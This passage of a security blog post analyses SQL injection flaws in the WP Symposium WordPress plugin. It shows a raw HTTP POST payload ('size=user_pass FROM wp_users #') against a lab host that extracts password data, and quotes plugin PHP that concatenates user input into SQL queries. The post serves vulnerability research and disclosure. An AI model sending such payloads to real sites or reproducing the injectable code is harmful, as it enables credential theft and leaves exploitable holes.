			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
POST /wordpress/wp-content/plugins/wp-symposium/get_album_item.php HTTP/1.0
Host: 192.168.80.130
Content-Type: application/x-www-form-urlencoded
Content-Length: 30

size=user_pass FROM wp_users #</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c98e78b50e9325536592-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b50e9325536592-2">2</div><div class="crayon-num" data-line="crayon-53c98e78b50e9325536592-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b50e9325536592-4">4</div><div class="crayon-num" data-line="crayon-53c98e78b50e9325536592-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b50e9325536592-6">6</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c98e78b50e9325536592-1"><span class="crayon-i">POST</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-i">wordpress</span><span class="crayon-o">/</span><span class="crayon-i">wp</span><span class="crayon-o">-</span><span class="crayon-i">content</span><span class="crayon-o">/</span><span class="crayon-i">plugins</span><span class="crayon-o">/</span><span class="crayon-i">wp</span><span class="crayon-o">-</span><span class="crayon-i">symposium</span><span class="crayon-o">/</span><span class="crayon-v">get_album_item</span><span class="crayon-sy">.</span><span class="crayon-e">php </span><span class="crayon-i">HTTP</span><span class="crayon-o">/</span><span class="crayon-cn">1.0</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b50e9325536592-2"><span class="crayon-i">Host</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-cn">192.168.80.130</span></div><div class="crayon-line" id="crayon-53c98e78b50e9325536592-3"><span class="crayon-i">Content</span><span class="crayon-o">-</span><span class="crayon-i">Type</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-i">application</span><span class="crayon-o">/</span><span class="crayon-i">x</span><span class="crayon-o">-</span><span class="crayon-i">www</span><span class="crayon-o">-</span><span class="crayon-i">form</span><span class="crayon-o">-</span><span class="crayon-e">urlencoded</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b50e9325536592-4"><span class="crayon-i">Content</span><span class="crayon-o">-</span><span class="crayon-i">Length</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-cn">30</span></div><div class="crayon-line" id="crayon-53c98e78b50e9325536592-5">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b50e9325536592-6"><span class="crayon-v">size</span><span class="crayon-o">=</span><span class="crayon-e">user_pass </span><span class="crayon-e">FROM </span><span class="crayon-i">wp_users</span><span class="crayon-h"> </span><span class="crayon-p">#</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0020 seconds] -->
<p><strong>Analysis of symposium_show_profile SQL injection vulnerability</strong></p>
<p>This vulnerability relies on the way which profiles are shown in Symposium. It calls into the symposium_show_profile method in symposium_profile.php file, which finds out what ID to show information for like this, assuming you are authenticated:</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c98e78b50f2397335105" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
// Adds profile page
function symposium_show_profile($page)  
{  

	global $wpdb, $current_user;

	$uid = '';

	if (isset($_POST['from']) &amp;amp;&amp;amp; $_POST['from'] == 'small_search') {
		if ($_POST['uid'] == '') {
			$search = $_POST['member_small'];
			$uid = $wpdb-&amp;gt;get_var("SELECT u.ID FROM ".$wpdb-&amp;gt;base_prefix."users u WHERE u.display_name LIKE '".$search."%'");
		}
	} 
	if ($uid == '') {

		if (isset($_GET['uid'])) {
			$uid = $_GET['uid'];
		} else {
			if (isset($_POST['uid'])) {
				$uid = $_POST['uid'];
			} else {
				$uid = $current_user-&amp;gt;ID;
			}
		}

	}

	// resolve stubs if using WPS permalinks
	if ( get_option('symposium_permalink_structure') &amp;amp;&amp;amp; get_query_var('stub')) {
		$stubs = explode('/', get_query_var('stub'));
		$stub0 = $stubs[0];
		if (WPS_DEBUG) echo $stub0.'&amp;lt;br /&amp;gt;';

		if ($stub0) {
			$sql = "SELECT ID FROM ".$wpdb-&amp;gt;base_prefix."users WHERE replace(display_name, ' ', '') = %s";
			$id = $wpdb-&amp;gt;get_var($wpdb-&amp;gt;prepare($sql, $stub0));
			if (WPS_DEBUG) echo $wpdb-&amp;gt;last_query.'&amp;lt;br /&amp;gt;';
			if ($id) {
				$uid = $id;
			}
		}
	}

	$share = get_symposium_meta($uid, 'share');
	if (WPS_DEBUG) echo 'UID:'.$uid.'&amp;lt;br /&amp;gt;';
	$html = '&amp;lt;div id="symposium_current_user_page" style="display:none"&amp;gt;'.$uid.'&amp;lt;/div&amp;gt;';

	if (is_user_logged_in() || $share == 'public') {		

		$user = $wpdb-&amp;gt;get_row("SELECT display_name FROM ".$wpdb-&amp;gt;base_prefix."users WHERE ID = ".$uid);</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c98e78b50f2397335105-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b50f2397335105-2">2</div><div class="crayon-num" data-line="crayon-53c98e78b50f2397335105-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b50f2397335105-4">4</div><div class="crayon-num" data-line="crayon-53c98e78b50f2397335105-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b50f2397335105-6">6</div><div class="crayon-num" data-line="crayon-53c98e78b50f2397335105-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b50f2397335105-8">8</div><div class="crayon-num" data-line="crayon-53c98e78b50f2397335105-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b50f2397335105-10">10</div><div class="crayon-num" data-line="crayon-53c98e78b50f2397335105-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b50f2397335105-12">12</div><div class="crayon-num" data-line="crayon-53c98e78b50f2397335105-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b50f2397335105-14">14</div><div class="crayon-num" data-line="crayon-53c98e78b50f2397335105-15">15</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b50f2397335105-16">16</div><div class="crayon-num" data-line="crayon-53c98e78b50f2397335105-17">17</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b50f2397335105-18">18</div><div class="crayon-num" data-line="crayon-53c98e78b50f2397335105-19">19</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b50f2397335105-20">20</div><div class="crayon-num" data-line="crayon-53c98e78b50f2397335105-21">21</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b50f2397335105-22">22</div><div class="crayon-num" data-line="crayon-53c98e78b50f2397335105-23">23</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b50f2397335105-24">24</div><div class="crayon-num" data-line="crayon-53c98e78b50f2397335105-25">25</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b50f2397335105-26">26</div><div class="crayon-num" data-line="crayon-53c98e78b50f2397335105-27">27</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b50f2397335105-28">28</div><div class="crayon-num" data-line="crayon-53c98e78b50f2397335105-29">29</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b50f2397335105-30">30</div><div class="crayon-num" data-line="crayon-53c98e78b50f2397335105-31">31</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b50f2397335105-32">32</div><div class="crayon-num" data-line="crayon-53c98e78b50f2397335105-33">33</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b50f2397335105-34">34</div><div class="crayon-num" data-line="crayon-53c98e78b50f2397335105-35">35</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b50f2397335105-36">36</div><div class="crayon-num" data-line="crayon-53c98e78b50f2397335105-37">37</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b50f2397335105-38">38</div><div class="crayon-num" data-line="crayon-53c98e78b50f2397335105-39">39</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b50f2397335105-40">40</div><div class="crayon-num" data-line="crayon-53c98e78b50f2397335105-41">41</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b50f2397335105-42">42</div><div class="crayon-num" data-line="crayon-53c98e78b50f2397335105-43">43</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b50f2397335105-44">44</div><div class="crayon-num" data-line="crayon-53c98e78b50f2397335105-45">45</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b50f2397335105-46">46</div><div class="crayon-num" data-line="crayon-53c98e78b50f2397335105-47">47</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b50f2397335105-48">48</div><div class="crayon-num" data-line="crayon-53c98e78b50f2397335105-49">49</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b50f2397335105-50">50</div><div class="crayon-num" data-line="crayon-53c98e78b50f2397335105-51">51</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c98e78b50f2397335105-1"><span class="crayon-c">// Adds profile page</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b50f2397335105-2"><span class="crayon-t">function</span><span class="crayon-h"> </span><span class="crayon-e">symposium_show_profile</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">page</span><span class="crayon-sy">)</span><span class="crayon-h">&nbsp;&nbsp;</span></div><div class="crayon-line" id="crayon-53c98e78b50f2397335105-3"><span class="crayon-sy">{</span><span class="crayon-h">&nbsp;&nbsp;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b50f2397335105-4">&nbsp;</div><div class="crayon-line" id="crayon-53c98e78b50f2397335105-5"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-m">global</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">current_user</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b50f2397335105-6">&nbsp;</div><div class="crayon-line" id="crayon-53c98e78b50f2397335105-7"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">uid</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">''</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b50f2397335105-8">&nbsp;</div><div class="crayon-line" id="crayon-53c98e78b50f2397335105-9"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-e">isset</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">_POST</span><span class="crayon-sy">[</span><span class="crayon-s">'from'</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">&amp;</span><span class="crayon-i">amp</span><span class="crayon-sy">;</span><span class="crayon-o">&amp;</span><span class="crayon-i">amp</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">_POST</span><span class="crayon-sy">[</span><span class="crayon-s">'from'</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">==</span><span class="crayon-h"> </span><span class="crayon-s">'small_search'</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b50f2397335105-10"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">_POST</span><span class="crayon-sy">[</span><span class="crayon-s">'uid'</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">==</span><span class="crayon-h"> </span><span class="crayon-s">''</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-53c98e78b50f2397335105-11"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">search</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">_POST</span><span class="crayon-sy">[</span><span class="crayon-s">'member_small'</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b50f2397335105-12"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">uid</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-o">-</span><span class="crayon-o">&amp;</span><span class="crayon-i">gt</span><span class="crayon-sy">;</span><span class="crayon-e">get_var</span><span class="crayon-sy">(</span><span class="crayon-s">"SELECT u.ID FROM "</span><span class="crayon-sy">.</span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-o">-</span><span class="crayon-o">&amp;</span><span class="crayon-i">gt</span><span class="crayon-sy">;</span><span class="crayon-v">base_prefix</span><span class="crayon-sy">.</span><span class="crayon-s">"users u WHERE u.display_name LIKE '"</span><span class="crayon-sy">.</span><span class="crayon-sy">$</span><span class="crayon-v">search</span><span class="crayon-sy">.</span><span class="crayon-s">"%'"</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98e78b50f2397335105-13"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b50f2397335105-14"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span><span class="crayon-h"> </span></div><div class="crayon-line" id="crayon-53c98e78b50f2397335105-15"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">uid</span><span class="crayon-h"> </span><span class="crayon-o">==</span><span class="crayon-h"> </span><span class="crayon-s">''</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b50f2397335105-16">&nbsp;</div><div class="crayon-line" id="crayon-53c98e78b50f2397335105-17"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-e">isset</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">_GET</span><span class="crayon-sy">[</span><span class="crayon-s">'uid'</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b50f2397335105-18"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">uid</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">_GET</span><span class="crayon-sy">[</span><span class="crayon-s">'uid'</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98e78b50f2397335105-19"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span><span class="crayon-h"> </span><span class="crayon-st">else</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b50f2397335105-20"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-e">isset</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">_POST</span><span class="crayon-sy">[</span><span class="crayon-s">'uid'</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-53c98e78b50f2397335105-21"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">uid</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">_POST</span><span class="crayon-sy">[</span><span class="crayon-s">'uid'</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b50f2397335105-22"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span><span class="crayon-h"> </span><span class="crayon-st">else</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-53c98e78b50f2397335105-23"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">uid</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">current_user</span><span class="crayon-o">-</span><span class="crayon-o">&amp;</span><span class="crayon-i">gt</span><span class="crayon-sy">;</span><span class="crayon-i">ID</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b50f2397335105-24"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line" id="crayon-53c98e78b50f2397335105-25"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b50f2397335105-26">&nbsp;</div><div class="crayon-line" id="crayon-53c98e78b50f2397335105-27"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b50f2397335105-28">&nbsp;</div><div class="crayon-line" id="crayon-53c98e78b50f2397335105-29"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-c">// resolve stubs if using WPS permalinks</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b50f2397335105-30"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-h"> </span><span class="crayon-e">get_option</span><span class="crayon-sy">(</span><span class="crayon-s">'symposium_permalink_structure'</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">&amp;</span><span class="crayon-i">amp</span><span class="crayon-sy">;</span><span class="crayon-o">&amp;</span><span class="crayon-i">amp</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-e">get_query_var</span><span class="crayon-sy">(</span><span class="crayon-s">'stub'</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-53c98e78b50f2397335105-31"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">stubs</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">explode</span><span class="crayon-sy">(</span><span class="crayon-s">'/'</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-e">get_query_var</span><span class="crayon-sy">(</span><span class="crayon-s">'stub'</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b50f2397335105-32"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">stub0</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">stubs</span><span class="crayon-sy">[</span><span class="crayon-cn">0</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98e78b50f2397335105-33"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-i">WPS_DEBUG</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-i">echo</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">stub0</span><span class="crayon-sy">.</span><span class="crayon-s">'&amp;lt;br /&amp;gt;'</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b50f2397335105-34">&nbsp;</div><div class="crayon-line" id="crayon-53c98e78b50f2397335105-35"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">stub0</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b50f2397335105-36"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">sql</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"SELECT ID FROM "</span><span class="crayon-sy">.</span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-o">-</span><span class="crayon-o">&amp;</span><span class="crayon-i">gt</span><span class="crayon-sy">;</span><span class="crayon-v">base_prefix</span><span class="crayon-sy">.</span><span class="crayon-s">"users WHERE replace(display_name, ' ', '') = %s"</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98e78b50f2397335105-37"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">id</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-o">-</span><span class="crayon-o">&amp;</span><span class="crayon-i">gt</span><span class="crayon-sy">;</span><span class="crayon-e">get_var</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-o">-</span><span class="crayon-o">&amp;</span><span class="crayon-i">gt</span><span class="crayon-sy">;</span><span class="crayon-e">prepare</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">sql</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">stub0</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b50f2397335105-38"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-i">WPS_DEBUG</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-i">echo</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-o">-</span><span class="crayon-o">&amp;</span><span class="crayon-i">gt</span><span class="crayon-sy">;</span><span class="crayon-v">last_query</span><span class="crayon-sy">.</span><span class="crayon-s">'&amp;lt;br /&amp;gt;'</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98e78b50f2397335105-39"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">id</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b50f2397335105-40"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">uid</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">id</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98e78b50f2397335105-41"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b50f2397335105-42"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line" id="crayon-53c98e78b50f2397335105-43"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b50f2397335105-44">&nbsp;</div><div class="crayon-line" id="crayon-53c98e78b50f2397335105-45"><span 